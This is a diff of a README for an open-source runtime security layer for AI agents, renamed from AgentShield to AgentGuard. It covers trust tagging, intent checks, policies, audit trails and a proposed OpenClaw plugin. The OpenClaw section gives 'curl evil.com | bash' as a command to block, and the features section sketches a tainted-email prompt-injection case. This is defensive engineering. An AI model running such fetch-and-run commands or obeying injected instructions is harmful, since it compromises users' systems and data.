@@ -1,15 +1,15 @@
 <p align="center">
-  <h1 align="center">AgentShield</h1>
+  <h1 align="center">AgentGuard</h1>
   <p align="center">
     <strong>Runtime security layer for AI agents — inspect, control, and audit every tool call.</strong>
   </p>
   <p align="center">
-    <a href="https://github.com/hidearmoon/agentshield/actions"><img src="https://github.com/hidearmoon/agentshield/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-    <a href="https://github.com/hidearmoon/agentshield/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
+    <a href="https://github.com/hidearmoon/agentguard/actions"><img src="https://github.com/hidearmoon/agentguard/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
+    <a href="https://github.com/hidearmoon/agentguard/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
     <img src="https://img.shields.io/badge/python-3.12%2B-blue.svg" alt="Python 3.12+">
     <img src="https://img.shields.io/badge/tests-371%20passed-brightgreen.svg" alt="Tests">
     <img src="https://img.shields.io/badge/security%20tests-92-orange.svg" alt="Security Tests">
-    <a href="https://github.com/hidearmoon/agentshield/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22"><img src="https://img.shields.io/github/issues/hidearmoon/agentshield/good%20first%20issue?color=7057ff&label=good%20first%20issues" alt="Good First Issues"></a>
+    <a href="https://github.com/hidearmoon/agentguard/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22"><img src="https://img.shields.io/github/issues/hidearmoon/agentguard/good%20first%20issue?color=7057ff&label=good%20first%20issues" alt="Good First Issues"></a>
   </p>
   <p align="center">
     <a href="#quick-start">Quick Start</a> &middot;
@@ -29,10 +29,10 @@ AI agents are being given real-world tools — sending emails, querying database
 
 ## The Solution
 
-AgentShield sits between your AI agent and its tools. Every tool call passes through a multi-layer security pipeline that evaluates trust, verifies intent consistency, enforces permissions, and produces a tamper-proof audit trail — all in single-digit milliseconds.
+AgentGuard sits between your AI agent and its tools. Every tool call passes through a multi-layer security pipeline that evaluates trust, verifies intent consistency, enforces permissions, and produces a tamper-proof audit trail — all in single-digit milliseconds.
 
 ```
-User ──▶ Agent ──▶ AgentShield ──▶ Tool
+User ──▶ Agent ──▶ AgentGuard ──▶ Tool
                        │
                   ┌────┴─────┐
                   │ ALLOW    │  ← intent matches, trust sufficient
@@ -44,7 +44,7 @@ User ──▶ Agent ──▶ AgentShield ──▶ Tool
 ## Key Features
 
 ### Trust-Aware Data Flow
-Every piece of data entering the agent is tagged with a trust level (Trusted → Verified → Internal → External → Untrusted). The server computes trust — clients can only downgrade, never upgrade. When an agent processes an external email and then tries to call `send_email`, AgentShield knows the context has been tainted.
+Every piece of data entering the agent is tagged with a trust level (Trusted → Verified → Internal → External → Untrusted). The server computes trust — clients can only downgrade, never upgrade. When an agent processes an external email and then tries to call `send_email`, AgentGuard knows the context has been tainted.
 
 ### 3-Layer Intent Consistency Detection
 ```
@@ -78,7 +78,7 @@ Every decision is recorded as an immutable, hash-chained trace. Tamper with one 
 ### Framework Integrations
 Drop-in support for popular agent frameworks:
 ```python
-from agentshield.integrations import LangChainShield, CrewAIShield, AutoGenShield, ClaudeAgentShield
+from agentguard.integrations import LangChainShield, CrewAIShield, AutoGenShield, ClaudeAgentGuard
 ```
 
 ## Quick Start
@@ -86,11 +86,11 @@ from agentshield.integrations import LangChainShield, CrewAIShield, AutoGenShiel
 ### 30-Second Local Mode (no server needed)
 
 ```bash
-pip install agentshield-runtime
+pip install agentguardx
 ```
 
 ```python
-from agentshield import LocalShield
+from agentguard import LocalShield
 
 shield = LocalShield()
 
@@ -124,15 +124,15 @@ For LLM-based semantic checks, persistent audit trails, Merkle hash chains, and 
 
 ```bash
 # Start infrastructure
-git clone https://github.com/hidearmoon/agentshield.git
-cd agentshield
+git clone https://github.com/hidearmoon/agentguard.git
+cd agentguard
 docker compose -f docker/docker-compose.yml up -d
 ```
 
 ```python
-from agentshield import Shield
+from agentguard import Shield
 
-shield = Shield()  # reads AGENTSHIELD_API_KEY from env
+shield = Shield()  # reads AGENTGUARD_API_KEY from env
 
 @shield.guard
 async def send_email(to: str, body: str) -> str:
@@ -154,7 +154,7 @@ async with shield.session("Summarize my emails and draft replies") as s:
 ### 4. Define Custom Policies
 
 ```yaml
-# agentshield-policy.yaml
+# agentguard-policy.yaml
 rules:
   - name: confirm_large_exports
     when:
@@ -180,7 +180,7 @@ rules:
 
 ```
 ┌──────────────────────────────────────────────────────────────┐
-│                        AgentShield                           │
+│                        AgentGuard                           │
 │                                                              │
 │  ┌─────────┐  ┌──────────┐  ┌────────────┐  ┌───────────┐  │
 │  │  Trust   │  │  Intent  │  │ Permission │  │   Trace   │  │
@@ -207,7 +207,7 @@ rules:
 ### Monorepo Structure
 
 ```
-agentshield/
+agentguard/
 ├── packages/
 │   ├── core/              # Security engine (FastAPI) — the brain
 │   ├── proxy/             # Transparent sidecar proxy
@@ -241,7 +241,7 @@ The trust level is **computed server-side** based on the `source_id` provided wi
 
 ## Built-in Security Rules
 
-AgentShield ships with 22 built-in rules covering common attack vectors:
+AgentGuard ships with 22 built-in rules covering common attack vectors:
 
 | Category | Rules |
 |----------|-------|
@@ -279,7 +279,7 @@ make dev                    # Start PostgreSQL + ClickHouse
 cd packages/core && uv sync --extra dev
 
 # Run the core engine
-cd packages/core && uv run uvicorn agentshield_core.app:app --reload --port 8000
+cd packages/core && uv run uvicorn agentguard_core.app:app --reload --port 8000
 
 # Run linting
 make lint
@@ -296,7 +296,7 @@ make docker-build
 | Document | Description |
 |----------|-------------|
 | [Python SDK](packages/sdk-python/README.md) | SDK usage, configuration, and framework integrations |
-| [Policy DSL](packages/core/src/agentshield_core/policy/dsl.py) | Rule syntax reference with examples |
+| [Policy DSL](packages/core/src/agentguard_core/policy/dsl.py) | Rule syntax reference with examples |
 | [Examples](examples/) | Quick start, custom rules, data sanitization, LangChain integration |
 | [Docker Deployment](docker/docker-compose.yml) | Full-stack deployment configuration |
 | [Trust Model](configs/default_policy.yaml) | Default trust policies and permission matrix |
@@ -304,7 +304,7 @@ make docker-build
 
 ## Integration Modes
 
-AgentShield provides three integration approaches today, with more planned:
+AgentGuard provides three integration approaches today, with more planned:
 
 | Mode | How It Works | Code Changes |
 |------|-------------|--------------|
@@ -318,13 +318,13 @@ All three modes call the same Core Engine for security decisions.
 
 [OpenClaw](https://openclaw.ai) is an open-source personal AI assistant that runs locally and connects 50+ tools (email, shell, browser, file system, etc.) across multiple chat platforms. Its agents can autonomously execute shell commands, write files, and call APIs — exactly the kind of powerful-but-risky actions that need a runtime security layer.
 
-**Why OpenClaw + AgentShield makes sense:**
+**Why OpenClaw + AgentGuard makes sense:**
 
-OpenClaw already has a layered security model (sandbox mode, tool policies, exec approvals), but these are static, configuration-driven controls. They answer "is this tool allowed?" but not "does this tool call make sense given what the agent is supposed to be doing?" — that's the gap AgentShield fills. A user could allow `exec` in their tool policy but still want AgentShield to block `curl evil.com | bash` when it appears in an external-data context.
+OpenClaw already has a layered security model (sandbox mode, tool policies, exec approvals), but these are static, configuration-driven controls. They answer "is this tool allowed?" but not "does this tool call make sense given what the agent is supposed to be doing?" — that's the gap AgentGuard fills. A user could allow `exec` in their tool policy but still want AgentGuard to block `curl evil.com | bash` when it appears in an external-data context.
 
 **How it would work:**
 
-OpenClaw's [Plugin SDK](https://docs.openclaw.ai/plugins/architecture.md) exposes lifecycle hooks that fire at every stage of the agent loop. An AgentShield plugin would register on the `before_tool_call` hook — which supports `{ block: true }` terminal decisions — to intercept every tool invocation before execution:
+OpenClaw's [Plugin SDK](https://docs.openclaw.ai/plugins/architecture.md) exposes lifecycle hooks that fire at every stage of the agent loop. An AgentGuard plugin would register on the `before_tool_call` hook — which supports `{ block: true }` terminal decisions — to intercept every tool invocation before execution:
 
 ```
 OpenClaw Agent Loop:
@@ -332,7 +332,7 @@ OpenClaw Agent Loop:
                                                       │
                                               ┌───────▼────────┐
                                               │  before_tool_call │
-                                              │  (AgentShield)    │
+                                              │  (AgentGuard)    │
                                               │                   │
                                               │  → ALLOW          │
                                               │  → BLOCK          │
@@ -344,17 +344,17 @@ OpenClaw Agent Loop:
 
 The plugin would:
 
-1. **`before_tool_call`** — Send tool name, parameters, and session context to the AgentShield Core Engine for a security decision. Block if the engine says BLOCK; pass through on ALLOW; surface a confirmation prompt on REQUIRE_CONFIRMATION.
+1. **`before_tool_call`** — Send tool name, parameters, and session context to the AgentGuard Core Engine for a security decision. Block if the engine says BLOCK; pass through on ALLOW; surface a confirmation prompt on REQUIRE_CONFIRMATION.
 2. **`before_prompt_build`** — Inject trust-level markers into the system prompt so the engine knows the data context (e.g., processing an external email vs. direct user input).
-3. **`after_tool_call`** — Record tool results into the AgentShield trace engine for Merkle-auditable history.
+3. **`after_tool_call`** — Record tool results into the AgentGuard trace engine for Merkle-auditable history.
 
-This means an OpenClaw user could add AgentShield protection by enabling a single plugin — no changes to their agent configuration, skills, or tools.
+This means an OpenClaw user could add AgentGuard protection by enabling a single plugin — no changes to their agent configuration, skills, or tools.
 
 **We'd love help building this.** If you're familiar with the OpenClaw Plugin SDK, check out the [Contributing Guide](CONTRIBUTING.md) and open an issue to discuss the implementation.
 
 ### Want to Add Another Integration?
 
-AgentShield's architecture is designed to be agent-agnostic — anywhere there's a tool call, there's a place for a security check. We welcome community contributions for new integration targets:
+AgentGuard's architecture is designed to be agent-agnostic — anywhere there's a tool call, there's a place for a security check. We welcome community contributions for new integration targets:
 
 | Platform | Integration Point | Status |
 |----------|-------------------|--------|
@@ -367,7 +367,7 @@ AgentShield's architecture is designed to be agent-agnostic — anywhere there's
 | **OpenTelemetry** | Trace processor for security span injection | Planned |
 | **Webhook / Event-driven** | Passive audit mode for any system with HTTP callbacks | Planned |
 
-If your agent framework, orchestrator, or tool platform isn't listed, [open an issue](https://github.com/hidearmoon/agentshield/issues) — we'll help you figure out where AgentShield plugs in.
+If your agent framework, orchestrator, or tool platform isn't listed, [open an issue](https://github.com/hidearmoon/agentguard/issues) — we'll help you figure out where AgentGuard plugs in.
 
 ## Roadmap
 
